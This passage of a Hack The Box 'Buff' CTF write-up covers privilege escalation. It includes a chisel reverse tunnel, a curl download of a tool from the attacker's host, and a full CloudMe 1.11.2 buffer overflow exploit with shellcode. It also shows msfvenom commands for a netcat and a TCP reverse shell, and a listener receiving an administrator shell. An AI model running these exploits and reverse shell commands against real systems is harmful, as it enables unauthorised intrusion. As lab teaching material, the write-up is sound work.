</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ chisel server -p 8080 --host 10.10.14.188 --reverse -v
</span></span><span class=line><span class=cl>2020/11/04 20:55:17 server: Reverse tunnelling enabled
</span></span><span class=line><span class=cl>2020/11/04 20:55:17 server: Fingerprint 67:21:79:97:03:c3:a6:2f:bd:d7:b9:c7:d9:1d:35:47
</span></span><span class=line><span class=cl>2020/11/04 20:55:17 server: Listening on 10.10.14.188:8080..
</span></span></code></pre></td></tr></table></div></div><p>Upload the binary & execute the client:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>xampp</span>\<span class=n>htdocs</span>\<span class=n>gym</span>\<span class=n>upload</span><span class=o>&gt;</span> <span class=n>curl</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.188</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span><span class=n>chisel</span><span class=o>.</span><span class=n>exe</span> <span class=o>--</span><span class=n>output</span> <span class=n>cyfun</span><span class=o>.</span><span class=n>exe</span>
</span></span><span class=line><span class=cl><span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>xampp</span>\<span class=n>htdocs</span>\<span class=n>gym</span>\<span class=n>upload</span><span class=o>&gt;</span> <span class=o>.</span>\<span class=n>cyfun</span><span class=o>.</span><span class=n>exe</span> <span class=n>client</span> <span class=o>-</span><span class=n>v</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.188</span><span class=p>:</span><span class=mi>8080</span> <span class=n>R</span><span class=p>:</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>44444</span><span class=p>:</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>8888</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>04</span> <span class=mi>20</span><span class=p>:</span><span class=mi>05</span><span class=p>:</span><span class=mi>19</span> <span class=n>client</span><span class=p>:</span> <span class=n>Connecting</span> <span class=n>to</span> <span class=n>ws</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.188</span><span class=p>:</span><span class=mi>8080</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>04</span> <span class=mi>20</span><span class=p>:</span><span class=mi>05</span><span class=p>:</span><span class=mi>20</span> <span class=n>client</span><span class=p>:</span> <span class=n>Handshaking</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>04</span> <span class=mi>20</span><span class=p>:</span><span class=mi>05</span><span class=p>:</span><span class=mi>20</span> <span class=n>client</span><span class=p>:</span> <span class=n>Fingerprint</span> <span class=mi>1</span><span class=n>a</span><span class=p>:</span><span class=n>a8</span><span class=p>:</span><span class=n>a6</span><span class=p>:</span><span class=n>b7</span><span class=p>:</span><span class=n>c1</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>25</span><span class=p>:</span><span class=n>d7</span><span class=p>:</span><span class=n>b0</span><span class=p>:</span><span class=mi>9</span><span class=n>d</span><span class=p>:</span><span class=n>c4</span><span class=p>:</span><span class=mi>51</span><span class=p>:</span><span class=mi>4</span><span class=n>e</span><span class=p>:</span><span class=mi>8</span><span class=n>f</span><span class=p>:</span><span class=n>b2</span><span class=p>:</span><span class=mi>5</span><span class=n>e</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>04</span> <span class=mi>20</span><span class=p>:</span><span class=mi>05</span><span class=p>:</span><span class=mi>20</span> <span class=n>client</span><span class=p>:</span> <span class=n>Sending</span> <span class=n>config</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>04</span> <span class=mi>20</span><span class=p>:</span><span class=mi>05</span><span class=p>:</span><span class=mi>20</span> <span class=n>client</span><span class=p>:</span> <span class=n>Connected</span> <span class=p>(</span><span class=n>Latency</span> <span class=mf>64.5615</span><span class=n>ms</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>2020</span><span class=o>/</span><span class=mi>11</span><span class=o>/</span><span class=mi>04</span> <span class=mi>20</span><span class=p>:</span><span class=mi>05</span><span class=p>:</span><span class=mi>20</span> <span class=n>client</span><span class=p>:</span> <span class=n>tun</span><span class=p>:</span> <span class=n>SSH</span> <span class=n>connected</span>
</span></span></code></pre></td></tr></table></div></div><p>But we have no clue what service is behind this port:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ nmap 127.0.0.1 -p 44444 -sVC
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 21:02 CET
</span></span><span class=line><span class=cl>Nmap scan report for localhost (127.0.0.1)
</span></span><span class=line><span class=cl>Host is up (0.000080s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE    VERSION
</span></span><span class=line><span class=cl>44444/tcp open  tcpwrapped
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
</span></span></code></pre></td></tr></table></div></div><p>The only hint we have is on the Download folder:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>C</span><span class=p>:</span>\<span class=n>xampp</span>\<span class=n>htdocs</span>\<span class=n>gym</span>\<span class=n>upload</span><span class=o>&gt;</span> <span class=n>dir</span> <span class=n>C</span><span class=p>:</span>\<span class=n>users</span>\<span class=n>shaun</span>\<span class=n>Downloads</span>\
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=n>Volume</span> <span class=ow>in</span> <span class=n>drive</span> <span class=n>C</span> <span class=n>has</span> <span class=n>no</span> <span class=n>label</span><span class=o>.</span>
</span></span><span class=line><span class=cl> <span class=n>Volume</span> <span class=n>Serial</span> <span class=n>Number</span> <span class=n>is</span> <span class=n>A22D</span><span class=o>-</span><span class=mi>49</span><span class=n>F7</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=ne>Directory</span> <span class=n>of</span> <span class=n>C</span><span class=p>:</span>\<span class=n>users</span>\<span class=n>shaun</span>\<span class=n>Downloads</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>14</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>2020</span>  <span class=mi>12</span><span class=p>:</span><span class=mi>27</span>    <span class=o>&lt;</span><span class=n>DIR</span><span class=o>&gt;</span>          <span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>14</span><span class=o>/</span><span class=mi>07</span><span class=o>/</span><span class=mi>2020</span>  <span class=mi>12</span><span class=p>:</span><span class=mi>27</span>    <span class=o>&lt;</span><span class=n>DIR</span><span class=o>&gt;</span>          <span class=o>..</span>
</span></span><span class=line><span class=cl><span class=mi>16</span><span class=o>/</span><span class=mi>06</span><span class=o>/</span><span class=mi>2020</span>  <span class=mi>15</span><span class=p>:</span><span class=mi>26</span>        <span class=mi>17</span><span class=p>,</span><span class=mi>830</span><span class=p>,</span><span class=mi>824</span> <span class=n>CloudMe_1112</span><span class=o>.</span><span class=n>exe</span>
</span></span><span class=line><span class=cl>               <span class=mi>1</span> <span class=ne>File</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>     <span class=mi>17</span><span class=p>,</span><span class=mi>830</span><span class=p>,</span><span class=mi>824</span> <span class=n>bytes</span>
</span></span><span class=line><span class=cl>               <span class=mi>2</span> <span class=n>Dir</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>   <span class=mi>7</span><span class=p>,</span><span class=mi>130</span><span class=p>,</span><span class=mi>439</span><span class=p>,</span><span class=mi>680</span> <span class=n>bytes</span> <span class=n>free</span>
</span></span></code></pre></td></tr></table></div></div><p>This CloudMe seems a little bit vulnerable:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ searchsploit cloudme
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                     |  Path
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>CloudMe 1.11.2 - Buffer Overflow (PoC)                                             | windows/remote/48389.py
</span></span><span class=line><span class=cl>CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                    | windows/local/48499.txt
</span></span><span class=line><span class=cl>Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                   | windows_x86-64/remote/45197.rb
</span></span><span class=line><span class=cl>CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                            | windows_x86-64/local/45159.py
</span></span><span class=line><span class=cl>CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                     | windows/remote/44175.rb
</span></span><span class=line><span class=cl>CloudMe Sync 1.11.0 - Local Buffer Overflow                                        | windows/local/44470.py
</span></span><span class=line><span class=cl>CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                    | windows/remote/46218.py
</span></span><span class=line><span class=cl>CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                           | windows_x86-64/remote/46250.py
</span></span><span class=line><span class=cl>CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                            | windows/remote/44027.py
</span></span><span class=line><span class=cl>CloudMe Sync &lt; 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                         | windows_x86-64/remote/44784.py
</span></span><span class=line><span class=cl>----------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ searchsploit -p 48389
</span></span><span class=line><span class=cl>  Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC)
</span></span><span class=line><span class=cl>      URL: https://www.exploit-db.com/exploits/48389
</span></span><span class=line><span class=cl>     Path: /usr/share/exploitdb/exploits/windows/remote/48389.py
</span></span><span class=line><span class=cl>File Type: ASCII text, with CRLF line terminators
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s see this BoF exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cp /usr/share/exploitdb/exploits/windows/remote/48389.py .
</span></span><span class=line><span class=cl>$ nvim 48389.py
</span></span></code></pre></td></tr></table></div></div><p>It seems the embedded shellcode is only making appear calc.exe, we need a
reverse shell instead. The last option is to name the variable <em>payload</em> instead of <em>buf</em>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>windows</span><span class=o>/</span><span class=n>exec</span> <span class=n>CMD</span><span class=o>=</span><span class=s1>&#39;C:\xampp\htdocs\gym\upload</span><span class=se>\n</span><span class=s1>c.exe 10.10.14.188 9999 -e powershell.exe&#39;</span> <span class=o>-</span><span class=n>b</span> <span class=s1>&#39;</span><span class=se>\x00\x0A\x0D</span><span class=s1>&#39;</span> <span class=o>-</span><span class=n>f</span> <span class=n>python</span> <span class=o>-</span><span class=n>v</span> <span class=n>payload</span>
</span></span></code></pre></td></tr></table></div></div><p>The whole modified exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
</span></span><span class=line><span class=cl><span class=c1># Date: 2020-04-27</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Author: Andy Bowden</span>
</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage: https://www.cloudme.com/en</span>
</span></span><span class=line><span class=cl><span class=c1># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
</span></span><span class=line><span class=cl><span class=c1># Version: CloudMe 1.11.2</span>
</span></span><span class=line><span class=cl><span class=c1># Tested on: Windows 10 x86</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Instructions:</span>
</span></span><span class=line><span class=cl><span class=c1># Start the CloudMe service and run the script.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>padding1</span>   <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>1052</span>
</span></span><span class=line><span class=cl><span class=n>EIP</span>        <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xB5\x42\xA8\x68</span><span class=s2>&#34;</span> <span class=c1># 0x68A842B5 -&gt; PUSH ESP, RET</span>
</span></span><span class=line><span class=cl><span class=n>NOPS</span>       <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>30</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span>  <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xdb\xd3\xbf\x10\x10\x1f\x4e\xd9\x74\x24\xf4\x5e</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x2b\xc9\xb1\x42\x83\xc6\x04\x31\x7e\x14\x03\x7e</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x04\xf2\xea\xb2\xcc\x70\x14\x4b\x0c\x15\x9c\xae</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x3d\x15\xfa\xbb\x6d\xa5\x88\xee\x81\x4e\xdc\x1a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x12\x22\xc9\x2d\x93\x89\x2f\x03\x24\xa1\x0c\x02</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xa6\xb8\x40\xe4\x97\x72\x95\xe5\xd0\x6f\x54\xb7</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x89\xe4\xcb\x28\xbe\xb1\xd7\xc3\x8c\x54\x50\x37</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x44\x56\x71\xe6\xdf\x01\x51\x08\x0c\x3a\xd8\x12</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x51\x07\x92\xa9\xa1\xf3\x25\x78\xf8\xfc\x8a\x45</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x35\x0f\xd2\x82\xf1\xf0\xa1\xfa\x02\x8c\xb1\x38</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x79\x4a\x37\xdb\xd9\x19\xef\x07\xd8\xce\x76\xc3</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xd6\xbb\xfd\x8b\xfa\x3a\xd1\xa7\x06\xb6\xd4\x67</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x8f\x8c\xf2\xa3\xd4\x57\x9a\xf2\xb0\x36\xa3\xe5</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x1b\xe6\x01\x6d\xb1\xf3\x3b\x2c\xdf\x02\xc9\x4a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xad\x05\xd1\x54\x81\x6d\xe0\xdf\x4e\xe9\xfd\x35</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x2b\x05\xb4\x14\x1d\x8e\x11\xcd\x1c\xd3\xa1\x3b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x62\xea\x21\xce\x1a\x09\x39\xbb\x1f\x55\xfd\x57</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x6d\xc6\x68\x58\xc2\xe7\xb8\x3b\x8b\x67\x3a\x9c</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x10\xb2\xe0\xa9\xe5\xa7\x6a\x21\x55\x69\xef\xa8</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x0c\x07\x86\x41\xba\xa5\x39\xd2\x2d\x38\xe6\x7e</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xd4\xcf\x7d\x0b\x79\x40\xde\x81\xea\xcf\xaa\x4b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x80\x77\x27\xb4\x2b\xb2\x9b\xc1\xd8\xa7\x51\x59</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x42\x5b\xfe\xfc\x0f\xf5\xa2\xa8\x86\x6d\x3e\x3a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x2b\x32\xae\xab\xb9\xab\x44\x1a\x49\x54\xed\x62</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>overrun</span>    <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>1500</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>padding1</span> <span class=o>+</span> <span class=n>NOPS</span> <span class=o>+</span> <span class=n>EIP</span> <span class=o>+</span> <span class=n>payload</span><span class=p>))</span>	
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=n>padding1</span> <span class=o>+</span> <span class=n>EIP</span> <span class=o>+</span> <span class=n>NOPS</span> <span class=o>+</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>overrun</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>=</span><span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>target</span><span class=p>,</span><span class=mi>44444</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>exc_value</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>I had no luck with the previous payload so I tried others:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>windows</span><span class=o>/</span><span class=n>exec</span> <span class=n>CMD</span><span class=o>=</span><span class=s1>&#39;copy C:\users\Administrator\desktop</span><span class=se>\r</span><span class=s1>oot.txt C:\users\shaun\Videos\cyfun.txt&#39;</span> <span class=o>-</span><span class=n>b</span> <span class=s1>&#39;</span><span class=se>\x00\x0A\x0D</span><span class=s1>&#39;</span> <span class=o>-</span><span class=n>f</span> <span class=n>python</span> <span class=o>-</span><span class=n>v</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl><span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>windows</span><span class=o>/</span><span class=n>shell_reverse_tcp</span> <span class=n>LHOST</span><span class=o>=</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.188</span> <span class=n>LPORT</span><span class=o>=</span><span class=mi>9999</span> <span class=o>-</span><span class=n>b</span> <span class=s1>&#39;</span><span class=se>\x00\x0A\x0D</span><span class=s1>&#39;</span> <span class=o>-</span><span class=n>f</span> <span class=n>python</span> <span class=o>-</span><span class=n>v</span> <span class=n>payload</span>
</span></span></code></pre></td></tr></table></div></div><p>I had more luck with <code>windows/shell_reverse_tcp</code> but it was just service being unstable.
It&rsquo;s possible the 1st exploit tentative made the service partially crash.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 9999 -vv
</span></span><span class=line><span class=cl>INFO: Listening on :::9999 (family 10/IPv6, TCP)
</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>INFO: Client connected from 10.10.10.198:49704 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>Microsoft Windows [Version 10.0.17134.1610]
</span></span><span class=line><span class=cl>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:\Windows\system32&gt;whoami
</span></span><span class=line><span class=cl>buff\administrator
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:\Windows\system32&gt;type c:\users\Administrator\desktop\root.txt
</span></span><span class=line><span class=cl>ccf880bd191ba6b99c413b3855a8bb6d
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
